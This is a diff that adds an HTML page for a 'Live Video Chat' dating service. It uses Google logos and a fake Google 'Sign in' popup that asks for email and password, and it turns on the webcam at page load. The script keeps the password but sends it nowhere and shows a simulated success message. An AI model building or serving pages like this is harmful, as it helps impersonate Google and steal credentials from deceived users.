@@ -1,0 +1,554 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"
+    />
+    <title>Live Video Chat Login</title>
+    <link
+      href="https://fonts.googleapis.com/css2?family=Roboto&display=swap"
+      rel="stylesheet"
+    />
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        font-family: "Roboto", Arial, sans-serif;
+        -webkit-tap-highlight-color: transparent;
+      }
+      body,
+      html {
+        width: 100%;
+        height: 100%;
+        overflow: hidden;
+        position: fixed;
+      }
+      body {
+        background: #e3f2fd;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        position: relative;
+      }
+      #camera-feed {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        object-fit: cover;
+        z-index: 0;
+        opacity: 0.3;
+        transform: scaleX(-1);
+      }
+      .container {
+        width: 90%;
+        max-width: 400px;
+        padding: 30px 20px;
+        border-radius: 16px;
+        background: rgba(255, 255, 255, 0.95);
+        box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
+        position: relative;
+        z-index: 1;
+        margin: 20px;
+        transition: all 0.3s ease;
+      }
+      .popup-container {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(0, 0, 0, 0.5);
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        z-index: 10;
+        opacity: 0;
+        visibility: hidden;
+        transition: all 0.3s ease;
+      }
+      .popup-container.active {
+        opacity: 1;
+        visibility: visible;
+      }
+      .popup-content {
+        background: white;
+        width: 90%;
+        max-width: 400px;
+        border-radius: 16px;
+        padding: 25px;
+        box-shadow: 0 5px 30px rgba(0, 0, 0, 0.3);
+        transform: scale(0.7);
+        transition: all 0.3s ease;
+        position: relative;
+        overflow: hidden;
+      }
+      .popup-container.active .popup-content {
+        transform: scale(1);
+      }
+      .logo {
+        text-align: center;
+        margin-bottom: 15px;
+      }
+      .logo img {
+        width: 80px;
+        height: auto;
+      }
+      .chat-title {
+        font-size: 20px;
+        font-weight: 600;
+        text-align: center;
+        margin-bottom: 10px;
+        color: #202124;
+      }
+      .subtitle {
+        font-size: 14px;
+        text-align: center;
+        color: #5f6368;
+        margin-bottom: 25px;
+        line-height: 1.4;
+      }
+      .form-group {
+        margin-bottom: 15px;
+      }
+      .form-group input {
+        width: 100%;
+        padding: 12px 15px;
+        border: 1px solid #dadce0;
+        border-radius: 8px;
+        font-size: 15px;
+        background: rgba(255, 255, 255, 0.8);
+        transition: all 0.3s ease;
+      }
+      .form-group input:focus {
+        border-color: #1a73e8;
+        outline: none;
+        background: #fff;
+        box-shadow: 0 0 0 2px rgba(26, 115, 232, 0.2);
+      }
+      .btn-google {
+        background: #1a73e8;
+        color: #fff;
+        border: none;
+        padding: 12px 20px;
+        border-radius: 8px;
+        font-size: 15px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        cursor: pointer;
+        margin: 0 auto;
+        width: 100%;
+        font-weight: 500;
+        transition: all 0.3s ease;
+        position: relative;
+        overflow: hidden;
+      }
+      .btn-google:hover {
+        background: #1765cc;
+        box-shadow: 0 2px 10px rgba(26, 115, 232, 0.4);
+      }
+      .btn-google:active {
+        transform: scale(0.98);
+      }
+      .btn-google .ripple {
+        position: absolute;
+        border-radius: 50%;
+        background: rgba(255, 255, 255, 0.7);
+        transform: scale(0);
+        animation: ripple 0.6s linear;
+        pointer-events: none;
+      }
+      @keyframes ripple {
+        to {
+          transform: scale(4);
+          opacity: 0;
+        }
+      }
+      .btn-google img {
+        width: 18px;
+        margin-right: 10px;
+        transition: transform 0.3s ease;
+      }
+      .btn-google:active img {
+        transform: scale(0.95);
+      }
+      .divider {
+        position: relative;
+        margin: 25px 0;
+        text-align: center;
+      }
+      .divider::before {
+        content: "";
+        position: absolute;
+        top: 50%;
+        left: 0;
+        right: 0;
+        height: 1px;
+        background: #dadce0;
+      }
+      .divider span {
+        background: white;
+        position: relative;
+        padding: 0 12px;
+        font-size: 13px;
+        color: #5f6368;
+      }
+      .buttons {
+        display: flex;
+        justify-content: space-between;
+        margin-top: 15px;
+      }
+      .btn-next {
+        background: #1a73e8;
+        color: #fff;
+        border: none;
+        padding: 10px 18px;
+        border-radius: 8px;
+        font-weight: 500;
+        cursor: pointer;
+        font-size: 14px;
+        transition: all 0.3s ease;
+      }
+      .btn-cancel {
+        background: #f1f3f4;
+        color: #5f6368;
+        border: none;
+        padding: 10px 18px;
+        border-radius: 8px;
+        font-weight: 500;
+        cursor: pointer;
+        font-size: 14px;
+        transition: all 0.3s ease;
+      }
+      .btn-next:hover {
+        background: #1765cc;
+        box-shadow: 0 2px 10px rgba(26, 115, 232, 0.4);
+      }
+      .btn-cancel:hover {
+        background: #e8eaed;
+      }
+      .loading-spinner {
+        border: 3px solid rgba(0, 0, 0, 0.1);
+        border-top: 3px solid #1a73e8;
+        border-radius: 50%;
+        width: 30px;
+        height: 30px;
+        animation: spin 1s linear infinite;
+        margin: 15px auto;
+      }
+      @keyframes spin {
+        0% {
+          transform: rotate(0deg);
+        }
+        100% {
+          transform: rotate(360deg);
+        }
+      }
+      .popup-step {
+        display: none;
+        animation: fadeIn 0.4s ease;
+      }
+      @keyframes fadeIn {
+        from {
+          opacity: 0;
+          transform: translateY(10px);
+        }
+        to {
+          opacity: 1;
+          transform: translateY(0);
+        }
+      }
+      .popup-step.active {
+        display: block;
+      }
+      .back-btn {
+        position: absolute;
+        left: 20px;
+        top: 20px;
+        background: none;
+        border: none;
+        font-size: 16px;
+        color: #1a73e8;
+        cursor: pointer;
+        display: none;
+      }
+      .popup-step.has-back .back-btn {
+        display: block;
+      }
+    </style>
+  </head>
+  <body>
+    <video id="camera-feed" autoplay playsinline muted></video>
+
+    <div class="container" id="main-container">
+      <!-- Step 1 -->
+      <div class="form-step active" id="step1">
+        <div class="logo">
+          <img
+            src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_112x36dp.png"
+            alt="Google"
+          />
+        </div>
+        <div class="chat-title">Live Video Chat</div>
+        <p class="subtitle">
+          Login with Google and enjoy private dating video chat
+        </p>
+        <button class="btn-google" id="google-login-btn">
+          <img
+            src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_112x36dp.png"
+            alt="Google"
+          />
+          Login with Google
+        </button>
+      </div>
+    </div>
+
+    <!-- Popup Container -->
+    <div class="popup-container" id="popup-container">
+      <div class="popup-content">
+        <!-- Email Step -->
+        <div class="popup-step active" id="popup-step1">
+          <button class="back-btn" id="popup-back-btn1" style="display: none">
+            &lt; Back
+          </button>
+          <div class="logo">
+            <img
+              src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_112x36dp.png"
+              alt="Google"
+            />
+          </div>
+          <div class="chat-title">Sign in</div>
+          <p class="subtitle">to continue to Live Video Chat</p>
+
+          <div class="form-group">
+            <input
+              type="text"
+              id="popup-email"
+              placeholder="Email or phone"
+              autocomplete="off"
+            />
+          </div>
+
+          <div class="buttons">
+            <button class="btn-cancel" id="cancel-btn">Cancel</button>
+            <button class="btn-next" id="popup-next-btn1">Next</button>
+          </div>
+        </div>
+
+        <!-- Password Step -->
+        <div class="popup-step has-back" id="popup-step2">
+          <button class="back-btn" id="popup-back-btn2">&lt; Back</button>
+          <div class="logo">
+            <img
+              src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_112x36dp.png"
+              alt="Google"
+            />
+          </div>
+          <div class="chat-title">Welcome</div>
+          <p class="subtitle" id="user-email-display">user@example.com</p>
+
+          <div class="form-group">
+            <input
+              type="password"
+              id="popup-password"
+              placeholder="Enter your password"
+              autocomplete="current-password"
+            />
+          </div>
+
+          <div class="buttons">
+            <button class="btn-cancel" id="cancel-btn2">Cancel</button>
+            <button class="btn-next" id="popup-next-btn2">Sign in</button>
+          </div>
+        </div>
+
+        <!-- Loading Step -->
+        <div class="popup-step" id="popup-step3">
+          <div class="logo">
+            <img
+              src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_112x36dp.png"
+              alt="Google"
+            />
+          </div>
+          <div class="chat-title">Signing in</div>
+          <div class="loading-spinner"></div>
+          <p class="subtitle" style="text-align: center">Please wait...</p>
+        </div>
+      </div>
+    </div>
+
+    <script>
+      // Current popup step
+      let currentPopupStep = 1;
+      const totalPopupSteps = 3;
+      let userEmail = "";
+
+      // Ripple effect for buttons
+      function createRipple(event) {
+        const button = event.currentTarget;
+        const circle = document.createElement("span");
+        const diameter = Math.max(button.clientWidth, button.clientHeight);
+        const radius = diameter / 2;
+
+        circle.style.width = circle.style.height = `${diameter}px`;
+        circle.style.left = `${
+          event.clientX - button.getBoundingClientRect().left - radius
+        }px`;
+        circle.style.top = `${
+          event.clientY - button.getBoundingClientRect().top - radius
+        }px`;
+        circle.classList.add("ripple");
+
+        const ripple = button.getElementsByClassName("ripple")[0];
+        if (ripple) {
+          ripple.remove();
+        }
+
+        button.appendChild(circle);
+      }
+
+      // Show popup
+      function showPopup() {
+        const popup = document.getElementById("popup-container");
+        popup.classList.add("active");
+        currentPopupStep = 1;
+        updatePopupSteps();
+      }
+
+      // Hide popup
+      function hidePopup() {
+        const popup = document.getElementById("popup-container");
+        popup.classList.remove("active");
+      }
+
+      // Update popup steps visibility
+      function updatePopupSteps() {
+        document.querySelectorAll(".popup-step").forEach((step, index) => {
+          if (index + 1 === currentPopupStep) {
+            step.classList.add("active");
+          } else {
+            step.classList.remove("active");
+          }
+        });
+      }
+
+      // Go to next popup step
+      function nextPopupStep() {
+        if (currentPopupStep === 1) {
+          // Save email for display in next step
+          userEmail = document.getElementById("popup-email").value;
+          if (!userEmail) {
+            alert("Please enter your email");
+            return;
+          }
+          document.getElementById("user-email-display").textContent = userEmail;
+        } else if (currentPopupStep === 2) {
+          const password = document.getElementById("popup-password").value;
+          if (!password) {
+            alert("Please enter your password");
+            return;
+          }
+          // Here you would typically validate credentials
+        }
+
+        if (currentPopupStep < totalPopupSteps) {
+          currentPopupStep++;
+          updatePopupSteps();
+
+          // If final step, simulate login process
+          if (currentPopupStep === totalPopupSteps) {
+            setTimeout(() => {
+              hidePopup();
+              alert("Login successful! Redirecting...");
+              // Here you would typically redirect to the main application
+            }, 2000);
+          }
+        }
+      }
+
+      // Go to previous popup step
+      function prevPopupStep() {
+        if (currentPopupStep > 1) {
+          currentPopupStep--;
+          updatePopupSteps();
+        }
+      }
+
+      // Add ripple effect to Google login button
+      const googleLoginBtn = document.getElementById("google-login-btn");
+      googleLoginBtn.addEventListener("click", function (e) {
+        createRipple(e);
+        setTimeout(() => {
+          showPopup();
+        }, 300);
+      });
+
+      // Cancel button events
+      document
+        .getElementById("cancel-btn")
+        .addEventListener("click", hidePopup);
+      document
+        .getElementById("cancel-btn2")
+        .addEventListener("click", hidePopup);
+
+      // Next button events
+      document
+        .getElementById("popup-next-btn1")
+        .addEventListener("click", nextPopupStep);
+      document
+        .getElementById("popup-next-btn2")
+        .addEventListener("click", nextPopupStep);
+
+      // Back button events
+      document
+        .getElementById("popup-back-btn1")
+        .addEventListener("click", prevPopupStep);
+      document
+        .getElementById("popup-back-btn2")
+        .addEventListener("click", prevPopupStep);
+
+      // Access camera automatically when page loads
+      document.addEventListener("DOMContentLoaded", function () {
+        const video = document.getElementById("camera-feed");
+
+        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+          navigator.mediaDevices
+            .getUserMedia({
+              video: {
+                facingMode: "user",
+                width: { ideal: 1280 },
+                height: { ideal: 720 },
+              },
+              audio: false,
+            })
+            .then(function (stream) {
+              video.srcObject = stream;
+              video.play();
+            })
+            .catch(function (error) {
+              console.log("Camera error: ", error);
+              video.style.display = "none";
+            });
+        } else {
+          video.style.display = "none";
+        }
+
+        // Prevent scrolling on mobile
+        document.body.addEventListener(
+          "touchmove",
+          function (e) {
+            if (!e.target.classList.contains("form-group")) {
+              e.preventDefault();
+            }
+          },
+          { passive: false }
+        );
+      });
+    </script>
+  </body>
+</html>
